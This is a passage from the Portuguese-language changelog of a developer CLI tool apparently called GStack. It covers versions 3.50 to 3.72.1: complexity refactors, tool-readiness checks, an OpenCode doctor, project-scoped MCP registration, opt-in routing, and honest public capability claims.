  errors="replace"`. `qg --strict` **3×3 determinístico, stderr zero**.

Não-reproduzíveis (medidos): `verify release` = `ready`; QG com **1 finding MEDIO**
(não 19). Já entregue: Headroom routing opt-in (v3.60). By design: cross-harness
PARTIAL (documentado).

## [3.72.1] - 2026-07-06

### Gate final do PRD25: qg-l1/qg-l2 strict verdes (decomposição CRAP)

O gate final (`verify --profile release`) bloqueou em `qg-l1`/`qg-l2` (modo `--strict`)
por complexidade real trazida ao diff-scope: `mcpRuntime` (cc 9, HIGH) e
`claimVfaProvenance` (CRAP 30 no limiar). **Causa corrigida, não mascarada**:

- **`src/commands/tools.js`**: `mcpRuntime` decomposto em `renderMcpRuntime` +
  `renderMcpRuntimeList` (cc≤6 cada; comportamento preservado — 7 testes mcp verdes).
- **`src/dream/auditor.js`**: `hasVfaProvenance` extraído (CRAP < 30).
- `qg --level 1 --strict` e `--level 2 --strict` → **exit 0, blocking 0**.

## [3.72.0] - 2026-07-06

### Cross-harness trust: claims públicos honestos (PRD 25 Sprint 25.5) — fecha o PRD25

A separação **enforced** (hooks reais) vs **advisory/instructional** (best-effort) é
deliberada e permanente — declarada como tal, impossível de vender como Zero-Trust
universal.

- **`src/dream/auditor.js`**: claim `cross-harness-trust` ganha **nota**: "PARTIAL por
  design… Zero-Trust universal não é um claim possível nem prometido" — impede tanto o
  overclaim quanto tratar o PARTIAL como bug.
- **`docs/guides/capabilities.md`**: bloco "Claim honesto (PRD25)" na matriz por
  harness — gates determinísticos valem como comando em qualquer harness; verificação
  ao vivo via `agents doctor --json` · `doctor --conformance --strict --json`.
- **Evidência medida**: `doctor --conformance --strict --json` → 10 harnesses, **0**
  instrucional com enforced, exit 0; `agents doctor --json` → ok. Testes
  `dream_audit` (+1 nota), `doctor_harness_matrix`/`policy_dsl` já garantiam
  instrucional ≠ enforced. QG CRIT/HIGH **0** (1 MEDIO pré-existente documentado),
  lint+`typecheck`+`typecheck:ts` verdes.

## [3.71.0] - 2026-07-06

### `dream improve` isolado (PRD 25 Sprint 25.4) — auto-dream REAL

Fecha o gap real do `dream audit` (`auto-dream: PARTIAL`): `improve` sai de
`not_implemented` e vira **fluxo isolado, revisável, nunca auto-merge**.

- **`src/dream/runner.js`** (novo, puro/injetável): `dreamImprove` — plano
  **determinístico** (claims não-REAL do audit + propostas em staging; sem LLM);
  `--dry-run` gera plano **sem escrever nada**; **sem executor configurado** grava
  proposta e explica (não falha opaco; GStack **não embute** executor — opt-in via
  injeção); com executor: **worktree** (`gstack/dream-improve-*`) → executor NA
  worktree → commit → **`verify` como gate** → proposta revisável com `merged: false`
  e **branch preservado** para review humano; cleanup da worktree mesmo em falha;
  provenance best-effort (`dream:improve:*`).
- **`src/commands/dream.js`**: `improve` ligado (`--dry-run/--json`), `status`
  atualizado; `inspect`/`accept`/`plan` seguem honestamente `not_implemented`.
- **`src/dream/auditor.js`** (critério já existente): `auto-dream` → **REAL**.
  **`dream audit` = 20 REAL / 1 PARTIAL / 0 PLACEBO / 0 RISK.**
- Testes `dream_improve` (6: dry-run puro, proposta sem executor, ordem
  worktree→executor→commit→verify→remove com `keepBranch`, cleanup em falha, CLI JSON,
  staging no plano) + `dream_audit` atualizado. QG CRIT/HIGH **0** (1 MEDIO
  não-bloqueante: FP conhecido de export consumido por teste via dynamic import),
  lint+`typecheck`+`typecheck:ts` verdes.

## [3.70.0] - 2026-07-06

### Output Guard: matriz reconciliada com o proxy pre-render REAL (PRD 25 Sprint 25.3)

O `dream audit` marcava `output-guard: RISK` porque `capabilities.js` declarava
`supportsPreOutputInterception: false` para todos — **dessincronizado** da implementação
que JÁ EXISTIA: `src/security/redact-proxy.js` (redaction em trânsito), comando
`gstack_vibehard proxy` e a matriz honesta em `guard-status.js`. Reconciliação, não
feature nova.

- **`src/dream/capabilities.js`**: claude/codex/opencode → `supportsPreOutputInterception:
  true` (rota REAL via proxy **OPT-IN** + base-URL custom); cursor/instrucionais seguem
  `false` (só auditoria pós-resposta).
- **`src/dream/auditor.js`**: `output-guard` REAL exige capability **E** o proxy shipado
  (`redact-proxy.js` + `guard-status.js` como evidência), com **nota** que impede
  overclaim: "opt-in… NÃO é Zero-Trust universal".
- **`tests/dream_audit.test.js`** atualizado deliberadamente (pre-render = exatamente
  claude/codex/opencode; REAL com nota; instrucional nunca pre-render).
- **`docs/guides/capabilities.md`**: claim público honesto do proxy.
- **Resultado: `dream audit` = 19 REAL / 2 PARTIAL / 0 PLACEBO / 0 RISK** (era 1 RISK).
  QG CRIT/HIGH **0**, lint+`typecheck`+`typecheck:ts` verdes.

## [3.69.0] - 2026-07-06

### Tool Freshness antes de claims (PRD 25 Sprint 25.2)

Freshness do Graphify **impossível de confundir**: `stale`/`absent` agora vêm com ação
recomendada explícita, no JSON e no render humano.

- **`src/tools/readiness.js`**: `freshness.recommendedAction` — `stale` ⇒
  `tools refresh --changed (ou graphify update .)`; `absent` ⇒ `graphify index .`;
  `fresh` ⇒ `null` (acceptance literal do PRD25 25.2).
- **`src/commands/tools.js`**: render de `tools readiness` destaca em warning
  `graph stale → <ação>`.
- **`docs/guides/capabilities.md`**: claim honesto (stale é warning visível; checar
  freshness antes de claims de topologia). Grafo real do repo atualizado via
  `tools refresh` (stale → **fresh**; nada global tocado, Headroom intocado).
- Teste `tool_readiness` estendido (recommendedAction por estado). QG CRIT/HIGH **0**,
  lint+`typecheck`+`typecheck:ts` verdes.

## [3.68.0] - 2026-07-06

### Release gate verde no Windows — evidência + tree-clean acionável (PRD 25 Sprint 25.1)

Reconciliação honesta do P0 do PRD25: o claim "npm test falha em runtime_e2e por EBUSY"
estava **desatualizado** — reproduzido agora: `runtime_e2e` isolado **3/3** e em loop
**5×5 PASS, zero EBUSY**; `npm test` completo **675/675, exit 0** (hardening EBUSY veio
na v3.23.0). **Nenhum fix inventado** — evidência registrada.

- Bloqueio REAL do `verify --profile release` era `publish-guard: tree-clean` por um
  arquivo untracked do usuário na raiz (movido para `.docs/PLANS/` com autorização do
  plano; **nada apagado**).
- **`src/project-plan/publish-guard.js`**: detail do `tree-clean` agora **lista os
  arquivos** (até 5, `+N` além) com orientação "commit, mova ou ignore; nada é apagado"
  — acionável, sem enfraquecer o gate (segue HARD).
- Testes `publish_guard` (+2: lista arquivos; resumo >5). QG CRIT/HIGH **0**, lint+
  `typecheck`+`typecheck:ts` verdes. Após o commit deste sprint, `verify --profile
  release` fica **não-blocked** (única pendência era a árvore suja).

## [3.67.0] - 2026-07-05

### Fallow release gate por regressão (baselines) — limpeza dead-code/dup

O verdict completo do `fallow audit` passa a **PASS**, gateando só **regressão nova**.

Diagnóstico honesto do `fail` anterior: era débito **majoritariamente arquitetural**, não
dead-code deletável. Dos 160 "unused exports" + 4 "unused files", **~90 são
falsos-positivos** do padrão de teste deste repo — os testes carregam módulos por
**dynamic import** (`imp("path")`), que a análise estática do Fallow não rastreia (o
código É usado; deletar quebraria a suíte). Somam-se 20 circular deps + ~290 complexity
(legado). Deleção **não** alcançaria verde e quebraria testes.

- **`.fallowrc.jsonc`** (novo) + **`.fallow-baselines/{dead-code,dupes,health}.json`**
  (novos): mecanismo **sancionado pelo Fallow** — baseline do débito atual; o gate
  (`npx fallow audit`, usado por `qg.py`/`stop.py`) falha só em dead-code/dupes/
  complexity **introduzidos além da linha de base**. Provado: baseline → `pass`; novo
  export não usado → `fail` (exit 1). **Não é "zero findings" — é "sem débito novo"**
  (`.fallow-baselines/README.md` documenta a honestidade; não afirmar "Fallow 100% limpo").
- Guard `fallow_baseline_config` (2): impede desabilitar o gate silenciosamente (config +
  baselines presentes). QG CRIT/HIGH ciclomático **0**, lint+`tsc` verdes.

## [3.66.0] - 2026-07-05

### Hash-Anchored Edit Guard (PRD 24 Sprint 24.6)

Reduz erro de edição *stale-line* (inspirado no hashline do oh-my-openagent): ao **ler**
um arquivo para editar, gera um hash curto do trecho (âncora); **antes** de aplicar o
patch, revalida que o trecho ainda bate. Se stale, **aborta de forma recuperável** (peça
nova leitura) e registra no provenance.

- **`src/tools/edit-guard.js`** (novo, PURO/injetável): `anchorHash` (12 hex, estável a
  CRLF), `excerpt` (linhas 1-indexed inclusivo), `makeAnchor`, `validateAnchor`
  (`{ok, stale, reason, expected, actual}`), `guardedEdit` (só aplica se bate; se stale
  não lança e sinaliza reler) + `provenanceRecorder` (opt-in, best-effort, grava recibo
  via `recordAction`).
- **`tools edit-guard anchor <file> <start> <end>` / `check <file> <start> <end> <hash>`**
  (`--json`); `check` sai com **exitCode 1** quando o trecho está stale.
- Testes `edit_guard` (6): hash determinístico/CRLF, excerpt, validate ok×stale,
  guardedEdit aplica×aborta, provenance gravado, CLI anchor→check com exit 1 em stale.
  QG CRIT/HIGH ciclomático **0**, lint+`tsc` verdes.

## [3.65.0] - 2026-07-05

### MCP project-scoped / runtime-injected (PRD 24 Sprint 24.5)

Adapta "MCP sob demanda" do oh-my-openagent **sem MCP global**: um MCP/tool
project-scoped é registrado SÓ no run context do GStack (`.gstack/mcp/runtime.json`) —
**nunca** em `~/.mcp.json` nem config global. readiness/doctor então distinguem
`runtime_injected` × `project_local` × `global`.

- **`src/mcp/scope.js`** (novo): `classifyScope` (pela fonte, sem tocar disco),
  `isDestructive` (**deny-default** — server destrutivo exige `--allow-destructive`),
  `registerRuntimeMcp`/`unregisterRuntimeMcp` (escrevem SÓ dentro do projeto, reversível),
  `readRuntimeMcp` (reader do inventário), `summarizeScopes`.
- **`src/tools/readiness.js`**: bloco `mcp.byScope` {runtime_injected, project_local,
  global} + `hasRuntimeInjected`, incluindo o run context como fonte (injetável via
  `mcpInventory`). Nunca lê/escreve config global.
- **`src/harness/opencode-doctor.js`**: categoria `mcp` que **diferencia** "MCP global
  ausente" de "MCP runtime-injected" e nota que runtime-injected **não aparece em
  `opencode mcp list`** (read-only; nunca toca `~/.mcp.json`).
- **`tools mcp runtime register|unregister|list [name] [--allow-destructive] [--json]`**.
- Testes `mcp_scope` (5) + `mcp_scope_integration` (2, readiness+doctor). QG CRIT/HIGH
  ciclomático **0**, lint+`tsc` verdes.

## [3.64.0] - 2026-07-05

### Skill Packs — evolui o Agent Factory (PRD 23 §6.5 · PRD21 §4.3 / Sprint D) — fecha a camada AIDD

Empacotamento de skills no padrão AIDD **sem duplicar** o Agent Factory: `agent-packs/`
é uma **fonte adicional** compilada para os MESMOS `agents/generated/` (claude/codex/
cursor/copilot/gemini), com Execution Contract + scanner/AgentShield + drift guard.

- **`agent-packs/gstack-aidd/`** (novo pack real): `PACK.md`/`CATALOG.md`/`CHANGELOG.md` +
  skill `guided-delivery` com `SKILL.md` (roteador) e actions `01-plan`/`02-execute`/
  `03-verify`. **Nenhuma action promete gate por LLM** — o gate é sempre determinístico.
- **`scripts/scripts/build_agents.js`**: `loadPacks`/`loadPackSkills`/`readPackSkill`/
  `readPackActions`/`appendPacks` (todos cc≤6). Cada skill vira agente `<pack>-<skill>`
  compilado em todos os adapters. A **fonte dos packs entra no hash** do manifest
  (editar um pack ⇒ `agents build --check` acusa drift) e é **escaneada ANTES** de gerar
  (builtin + AgentShield). Aditivo: sem packs, o build é idêntico ao anterior.
- **`agents/generated/`** regenerado: +1 agente (`gstack-aidd-guided-delivery`), 22 no total.
- Testes: `agent_packs` (3 — estrutura, actions, invariante "nenhum gate por LLM") +
  `build_agents` estendido (compila pack nos adapters, Execution Contract, drift ao
  editar a fonte do pack). QG CRIT/HIGH ciclomático **0**, lint+`tsc` verdes.

## [3.63.0] - 2026-07-05

### Trilha AI-Driven Dev (PRD 23 §6.4 · PRD21 §4.5 / Sprint C)

Trilha de onboarding com **5 aulas** que ensinam AI-driven dev usando **comandos reais**
do GStack. Inspirada em `lgsreal/ai-driven-dev` (referência metodológica, **nunca**
dependência runtime). **Ler a trilha não instala nada.**

- **`.docs/TRAILS/ai-driven-dev/01..05.md`** (novos): nova stack · IDEs agentic/harnesses ·
  AI no pipeline/DevSecOps · modernização/refactoring · GStack na prática. Cada aula tem
  as 7 seções do PRD21 §4.5 (objetivo, comandos reais, erros comuns, checklist, exercício,
  validar com `verify`, rollback). Aula 05 traz o mapa **AIDD→GStack** (PRD21 §4.4).
- **README.md + `docs/guides/quickstart.md`**: apontam para a trilha (onboarding).
- **`src/context-docs/py/context_db.py`**: `DOC_DIRS` ganhou `.docs/TRAILS`→`trail`, então
  as aulas entram no Context DB (indexadas via `rglob`; 5 aulas buscáveis por FTS).
- Teste `trail_docs` (3): 5 aulas × 7 seções; **cruza os comandos citados com
  `command-layers.js`** (falha se citar comando inexistente); mapa AIDD na aula 05.
- QG CRIT/HIGH ciclomático **0**, lint+`tsc` verdes.

## [3.62.0] - 2026-07-05

### Instruções project-scoped + firewall Knowledge/Execution (PRD 23 §6.3 · PRD22 §4.3 / Sprint B)

Barreira metodológica AIDD declarada de forma **máquina-legível** e instruções
project-scoped que exigem o registry antes de comparações externas. **Sem** editar config
global — só `AGENTS.md`/`CLAUDE.md` do projeto.

- **`src/meta/command-layers.js`** (novo): classificação `KNOWLEDGE` (read-only:
  `context`/`consult`/`challenge`/`plan` + diagnósticos) × `EXECUTION` (gated:
  `task`/`workflow`/`delegate`/`dev`/`verify`/`publish-guard` + mutadores) × `NEUTRAL`
  (`help`). Conjuntos **disjuntos**; `layerOf`/`isReadOnly` como fonte única. **Não é gate
  em runtime** — é classificação para docs/testes/revisão.
- **`AGENTS.md` + `CLAUDE.md`**: bloco "Research registry" (ler
  `repository-registry.json` antes de comparar; batch AIDD obrigatório p/ metodologia/
  skills/onboarding/marketplace/cross-harness; `archived_reference` = histórico; nunca
  vira dependência runtime) + bloco "Knowledge vs Execution".
- **`.docs/ADRS/adr-knowledge-execution-firewall.md`** (local): formaliza a invariante.
- Testes: `knowledge_execution_firewall` (3 — inclui guard de que **todo** comando do
  `DISPATCH` está classificado) + `comparison_gate` (3 — docs marcados
  `gstack-comparison-doc` devem citar o registry; instruções project-scoped presentes).
- QG CRIT/HIGH ciclomático **0**, lint+`tsc` verdes.

## [3.61.0] - 2026-07-05

### Registry de pesquisa AIDD (PRD 23 §6.2 · PRD21 §4.1 / Sprint A da camada AIDD)

Fonte única versionada dos repositórios de referência comparados pelo GStack. Abre a
camada de metodologia AIDD (PRD21/22 consolidados no PRD23) **sem** instalar nada:
referência metodológica **nunca** vira dependência runtime.

- **`.docs/RESEARCH/repository-registry.json`** (novo): `schemaVersion: 1`,
  `batch-6-aidd-methodology` obrigatório para `cross-harness`/`skills`/`onboarding`/
  `methodology`/`market-comparison`, com os 6 repos AIDD — lgsreal `learning_track`,
  framework `plugin_marketplace_and_sdlc`, manifest `product_manifesto`
  (`active_reference`); prompts/rules/community (`archived_reference`).
- **`.docs/RESEARCH/comparison-template.md`** (novo): template obrigatório para docs de
  comparação (marcador `gstack-comparison-doc: v1`) — contexto, batches obrigatórios
  (inclui AIDD), tabela adotar/adaptar/rejeitar, invariantes, "nunca vira dependência
  runtime". Ambos entram no Context DB via o indexer `.docs/RESEARCH`→`research` (24.4).
- Testes `repository_registry` (3) + `research_comparison_docs` (3). QG CRIT/HIGH
  ciclomático **0**, lint+`tsc` verdes.

## [3.60.0] - 2026-07-04

### Headroom Routing seguro e opt-in (PRD 24 Sprint 24.7) — fecha a trilha PRD24

Permite economia via Headroom **sem quebrar config global** de Claude/Codex/OpenCode.
Entra só depois de 24.1 (OpenCode Doctor v2) e 24.2 (Tool Readiness), como o PRD exige.

- **`src/tools/headroom-route.js`** (novo): `enableRouting`/`disableRouting`. O
  roteamento é feito por um **ENV project-scoped** controlado pelo GStack
  (`.gstack/headroom/env.sh` + `env.ps1` + `routing.json` manifest) que o usuário faz
  `source` **antes** de abrir o harness — o GStack **não** injeta em shell global,
  **nunca** roda `headroom wrap`, **nunca** edita `~/.codex`/`~/.claude`/
  `~/.config/opencode`, **nunca** registra MCP global.
- Recusa **OpenCode** (fora do routing automático até doctor específico) e o **modo
  global** (só `--project-only`). `disable --restore` **reverte** tudo que foi criado.
- **`tools headroom doctor|enable --harness codex|claude --project-only|disable
  --restore`**. O `doctor` reusa `buildReadiness` — `readiness` só marca `routed`
  quando `headroom doctor` prova proxy+routed (habilitar **não** mente sobre estar roteado).
- Teste `headroom_route` (4): env project-scoped/nada global, recusa opencode+global,
  restore reverte, CLI `--json` puro. QG CRIT/HIGH ciclomático **0**, lint+`tsc` verdes.

## [3.59.0] - 2026-07-04

### Action Close Tool Refresh (PRD 24 Sprint 24.3)

Contrato de fechamento de ação da IA: mantém contexto/ferramentas frescos **sem
tocar config global, sem ligar proxy/wrap, sem MCP global**.

- **`src/tools/refresh.js`** (novo): `buildToolRefresh` **puro/injetável** —
  refresca `graphify`/`context`/`headroom`/`fallow` em etapas **bounded/degraded**
  (nunca lança). Grava `.gstack/reports/tool-refresh/<runId>.json` e atualiza
  `.gstack/tool-readiness.json` com o **audit fresco** do Fallow (fecha 24.2↔24.3).
  `graphify` **pula** quando `--changed` e nenhum arquivo relevante mudou. Headroom
  **só classifica** routing (`doctor`) — nunca proxy/wrap. Falha = `degraded` (não
  trava o usuário comum); em `--strict` uma etapa bloqueante falha vira `error`.
- **`tools refresh [--changed] [--json] [--strict]`**. É batch (sem PTY) —
  **tmux nunca entra** (runners cross-platform via `execFileSync` bounded).
- **`stop.py`**: chamada **opt-in** (`GSTACK_TOOL_REFRESH=1`) bounded/best-effort no
  fim de sessão — **default OFF** para não adicionar lentidão.
- Teste `tool_refresh` (4): report+readiness, skip graphify, degraded vs error
  (strict), headroom só `doctor`. QG CRIT/HIGH ciclomático **0**, lint+`tsc` verdes.

## [3.58.0] - 2026-07-04

### Context DB — `.docs/RESEARCH` + regressão `search PRD22` (PRD 24 Sprint 24.4)

Delta sobre o índice (já cobria `.docs/PLANS/ADRS/AUDITS` desde 3.53.0):

- **`DOC_DIRS`** agora inclui **`.docs/RESEARCH`→`research`** (antes só o
  `docs/research` minúsculo era coberto).
- Teste e2e (Métrica §11): `.docs/RESEARCH` conta como fonte `research`, `prd22.md`
  é classificado como `prd`, e `context search "PRD22" --json` retorna **≥1** hit
  (via backend `fts`). 4 JS + 9 Python context tests verdes. QG CRIT/HIGH **0**.

## [3.57.0] - 2026-07-04

### Tool Readiness — campos ricos por ferramenta (PRD 24 Sprint 24.2)

`tools readiness` (já oficial desde 3.52.0) ganha os campos que o PRD24 §5 exige,
mantendo a honestidade (`callable_not_routed`, sem economia automática por Headroom):

- **Graphify** `metrics`: `{ indexedCommit, nodes, edges, communities }` — lidos do
  `graphify-out/graph.json` numa única parse (reusa a do freshness). No repo: 17807
  nós · 23163 arestas · 1540 comunidades.
- **Fallow** `auditSummary`: `{ verdict, deadCode, complexity, duplication, maxCyclomatic }`
  via runner **injetável** `fallowAudit`. Por default **não roda o audit** (pesado) —
  declara `verdict:"unknown"` com nota; é populado quando injetado (`tools refresh`/CI).
- **Context DB** `counts` **tipados**: `{ documents, chunks, entities, edges,
  bySource:{adr,prd,plans,research,docs,readme,repo,changelog} }` via
  `context_db.py status --db --json` (`runFull` bounded, sem truncar), só quando a DB existe.
- **Headroom** `routing`: `{ proxyRunning, byHarness:{claude,codex,opencode}, routed }`
  parseado do `headroom doctor`. Invariante mantida: `routed` só com proxy+routed provados.
- Topo: `lastUpdated` + `staleAfterSeconds` (freshness declarada). Render humano
  mostra métricas/verdict/counts/proxy. JSON puro; `schemaVersion` 2.
- Runners injetáveis (`runFull`/`fallowAudit`) → testes determinísticos sem spawn
  (`tool_readiness` 9). QG CRIT/HIGH ciclomático **0**, lint+`tsc` verdes.

## [3.56.0] - 2026-07-04

### OpenCode Doctor v2 (PRD 24 Sprint 24.1)

`doctor --opencode` evolui de diagnóstico config-only (v1) para um doctor de
máquina-limpa inspirado no oh-my-openagent — **read-only, sem escrita destrutiva,
config sagrada preservada byte-for-byte**.

- **`src/harness/opencode-doctor.js`** (novo): `buildOpenCodeDoctorV2` **puro/injetável**
  (`home`/`probe`/`pluginDir`/`pluginNames`) — schema `gstack.opencode.v2` com categorias
  `system`/`config`/`plugins`/`skills`/`models`/`residue` + `recommendedActions` +
  `exitCode` (**0** ok · **1** error · **2** warn; `exitCode` do JSON == `process.exitCode`).
  Compõe `diagnoseOpenCode` + `inspectOpenCodeConfig` + detecção dos plugins gerenciados
  + probe do CLI OpenCode. `enforcement` declara honestamente `rules_only`/`plugin_backed`.
- **`configAuthority`** (`jsonc`/`json`/`directory_only`/`conflict`): um `.jsonc`
  **sensível** (plugin/provider/model/OAuth) é a **autoridade** mesmo com um `.json` ao
  lado (que fica sombreado); `conflict` só quando ambos coexistem e o `.jsonc` não é
  sensível. Campo aditivo em `diagnoseOpenCode` (v1 intacto — clean-machine depende).
- **`doctor --help`** agora lista `--opencode` e `--fix opencode [--dry-run|--apply|
  --restore-jsonc]` (gap de UX corrigido). `--opencode --json` emite v2 **puro** no stdout.
- **Plugin `gstack-session.js`**: `session.deleted` reporta **degraded** curto (sem
  spawn de python) quando `stop.py` some de `~/.gstack/hooks` **e** `~/.codex/hooks`;
  `resolveStopPy` extraído (injetável).
- Fixtures de máquina-limpa (homes isoladas): jsonc sensível byte-for-byte, conflito
  (authority `jsonc`, shadowing `high`, exit 2), jsonc malformado (error, exit 1),
  resíduo `restore-jsonc`, plugins presentes, CLI ausente (warn/strict-error).
- Testes: `opencode_doctor_categories` (6), `opencode_plugin_degraded` (2),
  `doctor_opencode_help` (1) + `configAuthority` e fixture provider/model/plugin
  byte-for-byte. QG CRIT/HIGH ciclomático **0**, lint+`tsc` verdes.

## [3.55.0] - 2026-07-04

### Public Claims / Onboarding honesto (PRD 20 Sprint 20.6)

Ajuste da narrativa pública para vender **só o que o produto entrega hoje** —
fecha o PRD 20.

- **`docs/guides/capabilities.md`** (novo): separa a maturidade de cada capacidade
  em **real agora** / **callable-manual** / **opt-in** / **roadmap** (fonte viva:
  `tools readiness --json`). Inclui:
  - tabela **por harness** (Claude Code, Cursor, OpenCode, Devin = hooks reais;
    Codex = instrucional; Ruflo/Codebuff/Freebuff = candidatos, não instalados por default);
  - **Headroom não economiza tokens automaticamente**: enquanto não estiver `routed`,
    o estado honesto é `callable_not_routed` — sem claim de economia automática;
  - **caminho de 3 comandos** (`start` → `context scout --json` → `verify --changed-files --json`);
  - **comparação honesta** (quando usar gstack vs ECC/Ruflo/Codebuff — regra de ouro: não empilhar).
- **README.md / README.en.md**: seção de maturidade + destaque do Headroom + os 3
  comandos + link para `capabilities.md`; menção ao `tools clean-machine`.

Sem mudança de código (docs). Suíte completa verde (617), lint+`tsc` ok.

## [3.54.0] - 2026-07-04

### Clean-Machine Proof Pack (PRD 20 Sprint 20.5)

Prova **offline e reproduzível** de que o GStack não quebra a máquina real de um
usuário com Claude/Codex/OpenCode. `tools clean-machine [--json] [--no-write]
[--keep]` roda 12 cenários contra **homes-fixture isoladas** (nunca o `~` real,
sem rede) exercitando o **código de produção** — `safeWriteFile`,
`restoreBackupsFromManifest`, `diagnoseOpenCode`, `buildInstallImpact`,
`buildReadiness` — e afirma invariantes verificáveis:

- **OpenCode config-sacred**: sem config → `none`; só `.jsonc` sensível → detectado
  por nome e **byte-for-byte intocado**; conflito `json`+`jsonc` sensível → plano
  `preserve` (nunca consolida) + `shadowingRisk high` + ambos intactos; `.jsonc`
  malformado → `manual` sem escrita; resíduo `.jsonc.gstack-disabled` → `restore-jsonc`.
- **Lite mode não escreve nada global** (nenhum manifest em home; config do usuário
  intocada; escrita fica no projeto).
- **Full mode = Safe Write + manifest + backup**: arquivo novo vai ao manifest sem
  backup; arquivo existente ganha backup byte-for-byte + `restoreOnUninstall`.
- **Uninstall restaura configs preexistentes byte-for-byte** (rollback report sem erros).
- **Matriz de estados**: Headroom ausente/`callable_not_routed`/`routed`; Graphify
  `absent`/`fresh`/`stale`; Fallow `missing`/`callable`.
- Artefatos em `.gstack/reports/clean-machine/<runId>/` (`clean-machine.json`,
  `tool-readiness.json`, `install-impact.json`, `opencode-diagnosis.json`,
  `rollback-report.json`, `verify.json`).

O núcleo de restore do uninstall foi **extraído para `src/installer/restore.js`**
(injetável por `home`) — o proof pack roda o MESMO código, não uma reimplementação.
`uninstall.js` foi decomposto (`unregisterHooks`/`removeHermes`/`uninstall`/`list`,
cc→≤6) ao entrar no escopo diff do Fallow, behavior-preserving. Teste
`clean_machine_proof` (5). QG CRIT/HIGH **0**, lint+`tsc` verdes.

## [3.53.0] - 2026-07-04

### Context Index Completo + Decision Context (PRD 20 Sprint 20.4)

O Document Graph local (SQLite/FTS5) deixa de enxergar **só README+CHANGELOG (2
docs)** e passa a representar o repo de verdade — o layout REAL vive em `.docs/`
(maiúsculo), que a descoberta antiga (`docs/adr`, `docs/prd`…) ignorava.

- **`context index --reindex`** cobre `.docs/PLANS`, `.docs/ADRS`, `.docs/AUDITS`,
  `docs/*`, `README*`, `AGENTS.md`, `CLAUDE.md`, `CHANGELOG.md` + contrato/segurança.
  No próprio repo: **68 documentos** (prd 22 · plans 21 · docs 13 · adr 6 · readme 2
  · repo 2 · changelog 1 · audits 1) — antes 2. `discover()` reescrito com
  `classify_source` (arquivo `prd*`/`adr*` vira fonte própria) e dedup por path.
- **`context status --db`** agora traz `by_source` — contagem por ADR/PRD/plans/docs/
  README/changelog. Acessível mesmo sem `context init` (o índice é independente do
  registry).
- **`context scout --mode decision_context --json`** (novo subcomando `decision` no
  indexer): retorna `{ decision, evidence, file, lineStart, lineEnd, backend }` para
  decisões (heading/conteúdo com escolha/trade-off/rejeição/rationale, PT+EN).
- **Backend REAL por resultado**: `search`/scout marcam `fts` vs `scan` por hit
  (nunca fingem o motor usado).
- **`tokenAccounting.isEstimate`**: o scout DECLARA que a contagem de tokens é
  ESTIMATIVA local (`chars_div_4` / heurística), não medição de tokenizer — honesto.
- Teste `context_index_sources` (cobertura `.docs`, status por-fonte, decision_context
  com linhas + tokenAccounting). 17 JS + 9 Python context tests verdes. QG 0.

## [3.52.0] - 2026-07-04

### Tool Readiness como Produto (PRD 20 Sprint 20.3)

`.gstack/tool-readiness.json` deixa de ser arquivo mantido à mão e vira **comando
oficial verificável**: `gstack_vibehard tools readiness [--json] [--write]
[--clean-machine]`. Mede o estado REAL de cada ferramenta local — não uma
declaração estática.

- **`src/tools/readiness.js`** (novo, PURO/injetável — `probe`/`git`/`now`): sem
  side-effect, nunca lança. Status por ferramenta: `missing` ·
  `installed_not_callable` · `callable` · `callable_not_routed` · `routed`.
- **Headroom honesto**: `--version` funcionando ⇒ `callable_not_routed`. Só vira
  `routed` se `headroom doctor` confirmar **proxy rodando E tráfego roteado** —
  nunca vende economia automática que não existe.
- **Graphify freshness**: compara `built_at_commit` do `graphify-out/graph.json` com
  `git rev-parse HEAD` → `fresh` / `stale` / `unknown` / `absent`.
- **Campos**: OS/Node/npm/Python/PATH resumido, comando validado + exit code +
  stdout/stderr resumidos, artefatos, harness discovery (Codex/Claude/OpenCode,
  instrucional), `guardrails` (nunca `.env*`, nunca config global, project-scoped).
- **Cross-platform**: o probe usa `shell` para shims `.cmd`/`.bat` (Node ≥20 recusa
  spawnar `npm`/`npx` sem shell — CVE-2024-27980).
- **Escrita**: `--write` grava SÓ `.gstack/tool-readiness.json` (project-scoped);
  **default é read-only** (nada em disco). `--json` puro (write silencioso).
- Teste: `tool_readiness` (fallow callable, headroom callable_not_routed vs routed,
  graphify fresh/stale/absent, missing, `--json` puro + `--write`/no-write). QG 0.

## [3.51.0] - 2026-07-04

### QG Debt Burn-Down (PRD 20 Sprint 20.2)

Zera a dívida de complexidade ciclomática **CRITICAL/HIGH** do Fallow (65→0) que
bloqueava o release gate. Refatoração **behavior-preserving**: monólitos (switch/
if-chains gigantes, funções de 50–160 linhas) viram dispatchers finos + helpers
nomeados, com cada função em complexidade ≤6. Nenhuma mudança de comportamento —
cada comando validado por teste focado; **`--json` puro preservado**; suíte
completa **604/604 verde**.

- **Padrões aplicados**: (a) `switch`/if-chain de subcomando → mapa-registry
  (`DISPATCH`/`*_SUBS`/`*_HANDLERS`) + dispatcher enxuto; (b) cada `&&`/`||`/`?:`/
  `?.` custa +1 no Fallow → extraídos para micro-helpers nomeados; (c) render humano
  vs JSON separados; (d) parsing de flags por tabela.
- **CLIs decompostos**: `create.js` (`createProject` cc51, `writeRuntimeFiles` cc20),
  `install.js`, `doctor.js` (cc166), `tools.js` (cc89), `context.js` (cc78),
  `cli/index.js` (`dispatch` cc42), `orchestrate.js` (cc41), `challenge.js` (cc27),
  `plan.js`, `audit.js`, `secrets.js`, `verify.js`, `agents.js`, `runtime-supervisor.js`,
  `task.js`, `start.js`, `delegate.js`, `proxy.js`.
- **Núcleo decomposto**: `meta/orchestrator.js` (`runOrchestration` cc25),
  `runtime/supervisor.js` (`planStart` cc19/`stopAll`/`pollReadiness`),
  `project-plan/{verify-runner,executor,planner}.js`, `secrets/broker.js`
  (`parseDotEnv` cc12), `installer/{impact,opencode-jsonc}.js` (`stripJsonc` cc16
  → scanner por estado).
- **Mocks de teste** também zerados: `printing_press_install` (exec-mock cc18 →
  route-table), `runtime_e2e` (loops de polling → `waitForUp`/`waitForDown`).
- **Fix de regressão pega pela suíte**: o refactor de `cli/index.js` (switch→mapa)
  removeu os `case "<cmd>"` que o auditor anti-placebo (`dream/auditor.js`) usava como
  evidência de wiring — 6 capacidades REAIS (verify/runtime-supervisor/secrets-broker/
  agent-factory/vfa-provenance/meta-harness) passaram a ser sub-declaradas PARTIAL.
  `cliHasCommand` agora reconhece o registry-map (`name: "<cmd>"`); placar de volta a
  **REAL:18** (idêntico ao repo pré-sprint). `audit()` (cc68) também decomposto em 21
  builders puros de claim.
- Fallow L1 (Sprint 20.2): **CRITICAL/HIGH 64→0**, zero introduzidos. Lint + `tsc`
  `--noEmit` verdes.

## [3.50.0] - 2026-07-03

